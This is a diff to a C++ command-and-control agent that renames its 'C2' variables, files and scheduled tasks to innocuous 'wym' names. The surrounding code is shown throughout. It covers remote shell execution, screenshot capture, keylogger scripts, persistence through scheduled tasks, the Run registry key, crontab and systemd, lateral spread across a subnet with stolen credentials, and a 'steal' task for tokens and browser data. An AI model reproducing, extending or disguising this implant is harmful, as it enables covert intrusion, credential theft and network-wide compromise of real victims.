@@ -14,14 +14,14 @@
  *       --interval 5 --jitter 2 --verbose
  *
  * Environment variables (accepted when the flag is not given):
- *   C2_SERVER, C2_TOKEN, C2_INTERVAL, C2_JITTER, C2_STATE_FILE, C2_VERBOSE
+ *   WYM_SERVER, WYM_TOKEN, WYM_INTERVAL, WYM_JITTER, WYM_STATE_FILE, WYM_VERBOSE
  *
  * Flags:
- *   --server URL      server base URL (required unless C2_SERVER is set)
- *   --token TOKEN     shared agent token (required unless C2_TOKEN is set)
+ *   --server URL      server base URL (required unless WYM_SERVER is set)
+ *   --token TOKEN     shared agent token (required unless WYM_TOKEN is set)
  *   --interval N      heartbeat interval in seconds (default 10, min 1)
  *   --jitter N        random jitter in seconds added to the interval
- *   --state FILE      state file persisting the agent id (default ~/.c2agent_cpp.json)
+ *   --state FILE      state file persisting the agent id (default ~/.wymagent_cpp.json)
  *   --verbose         print activity to stdout
  *   -h, --help        show this help and exit
  *
@@ -172,7 +172,7 @@ static std::string state_path() {
     if (!g_state_override.empty()) return g_state_override;
     const char *home = getenv(HOME_ENV);
     if (!home) home = ".";
-    return std::string(home) + PATH_SEP + ".c2agent_cpp.json";
+    return std::string(home) + PATH_SEP + ".wymagent_cpp.json";
 }
 
 /* ---------------------------------------------------------------- JSON helpers */
@@ -240,9 +240,9 @@ static std::string g_self_path;  /* argv[0], used by persistence/lateral */
 /* ---------------------------------------------------------------- curl helpers */
 
 /* libcurl verifies TLS certificates by default. Operators using self-signed
- * test certificates can suppress that explicitly with C2_INSECURE_TLS=1. */
+ * test certificates can suppress that explicitly with WYM_INSECURE_TLS=1. */
 static bool tls_no_verify() {
-    const char *e = getenv("C2_INSECURE_TLS");
+    const char *e = getenv("WYM_INSECURE_TLS");
     return e && (strcmp(e, "1") == 0 || strcmp(e, "true") == 0 || strcmp(e, "yes") == 0);
 }
 
@@ -455,8 +455,8 @@ static std::string run_shell(const std::string &command, int timeout, int &exit_
     char tmpdir[MAX_PATH] = "";
     GetTempPathA(sizeof(tmpdir), tmpdir);
     DWORD self_pid = GetCurrentProcessId();
-    std::string bat = std::string(tmpdir) + "c2run_" + std::to_string(self_pid) + ".cmd";
-    std::string outpath = std::string(tmpdir) + "c2run_" + std::to_string(self_pid) + ".out";
+    std::string bat = std::string(tmpdir) + "wymrun_" + std::to_string(self_pid) + ".cmd";
+    std::string outpath = std::string(tmpdir) + "wymrun_" + std::to_string(self_pid) + ".out";
 
     FILE *bf = fopen(bat.c_str(), "w");
     if (!bf) {
@@ -686,7 +686,7 @@ static void task_screenshot(const std::string &task_id, const std::string &args_
 #ifdef _WIN32
     const char *tmpdir = getenv("TEMP");
     if (!tmpdir) tmpdir = ".";
-    std::string tmp = std::string(tmpdir) + "\\c2shot_" + std::to_string(getpid()) + ".png";
+    std::string tmp = std::string(tmpdir) + "\\wymshot_" + std::to_string(getpid()) + ".png";
     std::string tmpfwd;
     for (char c : tmp) tmpfwd += (c == '\\') ? '/' : c;
     std::string ps =
@@ -700,10 +700,10 @@ static void task_screenshot(const std::string &task_id, const std::string &args_
     std::string full = "powershell -NoProfile -command \"" + ps + "\"";
     system(full.c_str());
 #elif defined(__APPLE__)
-    std::string tmp = "/tmp/c2shot_" + std::to_string(getpid()) + ".png";
+    std::string tmp = "/tmp/wymshot_" + std::to_string(getpid()) + ".png";
     system(("screencapture -x \"" + tmp + "\"").c_str());
 #else
-    std::string tmp = "/tmp/c2shot_" + std::to_string(getpid()) + ".png";
+    std::string tmp = "/tmp/wymshot_" + std::to_string(getpid()) + ".png";
     std::string cmd = "(command -v import && import -window root \"" + tmp + "\") || "
         "(command -v scrot && scrot \"" + tmp + "\") || "
         "(command -v gnome-screenshot && gnome-screenshot -f \"" + tmp + "\")";
@@ -779,7 +779,7 @@ static std::string keylog_dir() {
 }
 
 static std::string keylog_base(const std::string &agent_id) {
-    return keylog_dir() + PATH_SEP + ".c2keylog_" + agent_id;
+    return keylog_dir() + PATH_SEP + ".wymkeylog_" + agent_id;
 }
 
 static bool file_exists(const std::string &p) {
@@ -827,7 +827,7 @@ static void keylog_write_collectors(const std::string &base) {
 
     std::ofstream sh(sh_path);
     sh << "#!/bin/sh\n"
-       << "C2P=${C2P:-/tmp/.c2nope}; C2K=${C2K:-/tmp/.c2nope}\n"
+       << "C2P=${C2P:-/tmp/.wymnope}; C2K=${C2K:-/tmp/.wymnope}\n"
        << "echo $$ > \"$C2P\"\n"
        << "kid=$(xinput list 2>/dev/null | grep -i -m1 keyboard | sed -E 's/.*id=([0-9]+).*/\\1/')\n"
        << "[ -z \"$kid\" ] && exit 1\n"
@@ -1090,12 +1090,12 @@ static void task_persistence(const std::string &args_json, std::string &output, 
     const char *appdata = getenv("APPDATA");
     if (!appdata || !*appdata) appdata = getenv("USERPROFILE");
     if (!appdata || !*appdata) appdata = ".";
-    std::string destdir = std::string(appdata) + "\\Microsoft\\Windows\\c2update";
-    std::string dest = destdir + "\\c2agent.exe";
+    std::string destdir = std::string(appdata) + "\\Microsoft\\Windows\\wymupdate";
+    std::string dest = destdir + "\\wymagent.exe";
 #else
     const char *home = getenv("HOME");
     if (!home || !*home) home = ".";
-    std::string destdir = std::string(home) + "/.config/c2update";
+    std::string destdir = std::string(home) + "/.config/wymupdate";
     std::string dest = destdir + "/" + path_basename(self);
 #endif
     std::error_code ec;
@@ -1115,7 +1115,7 @@ static void task_persistence(const std::string &args_json, std::string &output, 
     const char *progdata = getenv("ProgramData");
     if (!progdata || !*progdata) progdata = getenv("ALLUSERSPROFILE");
     if (!progdata || !*progdata) progdata = "C:\\ProgramData";
-    std::string launcher = std::string(progdata) + "\\c2update\\c2relaunch.cmd";
+    std::string launcher = std::string(progdata) + "\\wymupdate\\wymrelaunch.cmd";
     std::filesystem::create_directories(std::filesystem::path(launcher).parent_path(), ec);
     std::ofstream lf(launcher);
     if (!lf) {
@@ -1127,14 +1127,14 @@ static void task_persistence(const std::string &args_json, std::string &output, 
     lf.close();
     output += "\npersistence: wrote launcher " + launcher;
 
-    std::string cmd = "schtasks /Create /TN \"c2agent-persist\" /TR \"" + launcher +
+    std::string cmd = "schtasks /Create /TN \"wymagent-persist\" /TR \"" + launcher +
                       "\" /SC ONLOGON /RL HIGHEST /F";
     sh = run_shell(cmd, 60, rc);
     if (rc == 0) {
         ok = true;
     } else {
         output += "\n  schtasks err: " + err_line(sh);
-        std::string reg = "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v c2agent /t REG_SZ /d " +
+        std::string reg = "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v wymagent /t REG_SZ /d " +
                           launcher + " /f";
         sh = run_shell(reg, 60, rc);
         if (rc == 0) ok = true;
@@ -1144,19 +1144,19 @@ static void task_persistence(const std::string &args_json, std::string &output, 
               (ok ? "launch hook registered (schtasks)" : "no launch hook registered");
     exit_code = ok ? 0 : 1;
 #else
-    std::string line = "@reboot " + relaunch + " # c2agent-persist";
-    std::string cmd = "(crontab -l 2>/dev/null | grep -v 'c2agent-persist'; echo \"" +
+    std::string line = "@reboot " + relaunch + " # wymagent-persist";
+    std::string cmd = "(crontab -l 2>/dev/null | grep -v 'wymagent-persist'; echo \"" +
                       line + "\") | crontab -";
     sh = run_shell(cmd, 60, rc);
     bool ok_cron = (rc == 0);
     if (!ok_cron) output += "\n  crontab err: " + err_line(sh);
 
     bool ok_sys = false;
-    std::string unit = destdir + "/c2-update.service";
+    std::string unit = destdir + "/wym-update.service";
     std::ofstream uf(unit);
     if (uf) {
         uf << "[Unit]\n"
-           << "Description=c2 agent update\n\n"
+           << "Description=wym agent update\n\n"
            << "[Service]\n"
            << "Type=simple\n"
            << "ExecStart=/bin/sh -c \"" << relaunch << "\"\n"
@@ -1235,8 +1235,8 @@ static void task_lateral(const std::string &args_json, std::string &output, int 
     std::string subnet = json_find_string(args_json, "subnet");
     std::string user = json_find_string(args_json, "user");
     std::string pass = json_find_string(args_json, "pass");
-    const char *eu = getenv("C2_LAT_USER");
-    const char *ep = getenv("C2_LAT_PASS");
+    const char *eu = getenv("WYM_LAT_USER");
+    const char *ep = getenv("WYM_LAT_PASS");
     if (user.empty() && eu) user = eu;
     if (pass.empty() && ep) pass = ep;
 
@@ -1274,7 +1274,7 @@ static void task_lateral(const std::string &args_json, std::string &output, int 
         std::string host = u32_to_ip(ipu);
         std::string status;
         if (user.empty() || pass.empty()) {
-            status = "skipped (no credentials; set C2_LAT_USER/C2_LAT_PASS)";
+            status = "skipped (no credentials; set WYM_LAT_USER/WYM_LAT_PASS)";
             skipped++;
             output += "\n  " + host + ": " + status;
             continue;
@@ -1296,10 +1296,10 @@ static void task_lateral(const std::string &args_json, std::string &output, int 
                 status = "failed (copy: " + err_line(sh) + ")";
                 failed++;
             } else {
-                cmd = "schtasks /Create /S " + host + " /TN \"c2agent-lateral\" /TR \"" + relaunch +
+                cmd = "schtasks /Create /S " + host + " /TN \"wymagent-lateral\" /TR \"" + relaunch +
                       "\" /SC ONLOGON /RU " + user + " /RP " + pass + " /RL HIGHEST /F";
                 sh = run_shell(cmd, 30, rc);
-                if (rc == 0) status = "deployed (file dropped + scheduled c2agent-lateral)";
+                if (rc == 0) status = "deployed (file dropped + scheduled wymagent-lateral)";
                 else status = "deployed (file dropped; task: " + err_line(sh) + ")";
                 deployed++;
             }
@@ -1504,7 +1504,7 @@ static void task_steal(const std::string &task_id, const std::string &args_json,
     if (profile != "all" && profile != "env" && profile != "tokens" && profile != "browser")
         profile = "all";
 
-    std::string work = std::filesystem::temp_directory_path().string() + "c2steal_";
+    std::string work = std::filesystem::temp_directory_path().string() + "wymsteal_";
     work += std::to_string(time(nullptr)) + "_" + std::to_string(getpid());
     std::error_code ec;
     std::filesystem::create_directories(work, ec);
@@ -1619,24 +1619,24 @@ int main(int argc, char *argv[]) {
     if (help) {
         std::cout << "usage: ./agent --server URL --token TOKEN [--interval N] [--jitter N] [--state FILE] [--verbose]\n";
         std::cout << "\n";
-        std::cout << "Flags (also settable via C2_SERVER/C2_TOKEN/C2_INTERVAL/C2_JITTER/C2_STATE_FILE/C2_VERBOSE):\n";
-        std::cout << "  --server URL      server base URL (required unless C2_SERVER is set)\n";
-        std::cout << "  --token TOKEN     shared agent token (required unless C2_TOKEN is set)\n";
+        std::cout << "Flags (also settable via WYM_SERVER/WYM_TOKEN/WYM_INTERVAL/WYM_JITTER/WYM_STATE_FILE/WYM_VERBOSE):\n";
+        std::cout << "  --server URL      server base URL (required unless WYM_SERVER is set)\n";
+        std::cout << "  --token TOKEN     shared agent token (required unless WYM_TOKEN is set)\n";
         std::cout << "  --interval N      heartbeat interval in seconds (default 10, min 1)\n";
         std::cout << "  --jitter N        random jitter in seconds added to the interval\n";
-        std::cout << "  --state FILE      state file persisting the agent id (default ~/.c2agent_cpp.json)\n";
+        std::cout << "  --state FILE      state file persisting the agent id (default ~/.wymagent_cpp.json)\n";
         std::cout << "  --verbose         print activity to stdout\n";
         std::cout << "  -h, --help        show this help and exit\n";
         return 0;
     }
 
     /* Env var fallback */
-    if (!g_server_buf[0]) { const char *e = getenv("C2_SERVER"); if (e) strncpy(g_server_buf, e, sizeof(g_server_buf) - 1); }
-    if (!g_token_buf[0])  { const char *e = getenv("C2_TOKEN");  if (e) strncpy(g_token_buf, e, sizeof(g_token_buf) - 1); }
-    if (!interval_given) { const char *e = getenv("C2_INTERVAL"); if (e && *e) g_interval = atoi(e); }
-    if (!jitter_given)   { const char *e = getenv("C2_JITTER");   if (e && *e) g_jitter = atoi(e); }
-    if (!state_given)    { const char *e = getenv("C2_STATE_FILE"); if (e) g_state_override = e; }
-    if (!verbose_given) { const char *e = getenv("C2_VERBOSE"); if (e && (strcmp(e, "1") == 0 || strcmp(e, "true") == 0)) g_verbose = true; }
+    if (!g_server_buf[0]) { const char *e = getenv("WYM_SERVER"); if (e) strncpy(g_server_buf, e, sizeof(g_server_buf) - 1); }
+    if (!g_token_buf[0])  { const char *e = getenv("WYM_TOKEN");  if (e) strncpy(g_token_buf, e, sizeof(g_token_buf) - 1); }
+    if (!interval_given) { const char *e = getenv("WYM_INTERVAL"); if (e && *e) g_interval = atoi(e); }
+    if (!jitter_given)   { const char *e = getenv("WYM_JITTER");   if (e && *e) g_jitter = atoi(e); }
+    if (!state_given)    { const char *e = getenv("WYM_STATE_FILE"); if (e) g_state_override = e; }
+    if (!verbose_given) { const char *e = getenv("WYM_VERBOSE"); if (e && (strcmp(e, "1") == 0 || strcmp(e, "true") == 0)) g_verbose = true; }
 
     if (!g_server_buf[0] || !g_token_buf[0]) {
         fprintf(stderr, "usage: ./agent --server URL --token TOKEN [--interval N] [--jitter N] [--state FILE] [--verbose]\n");
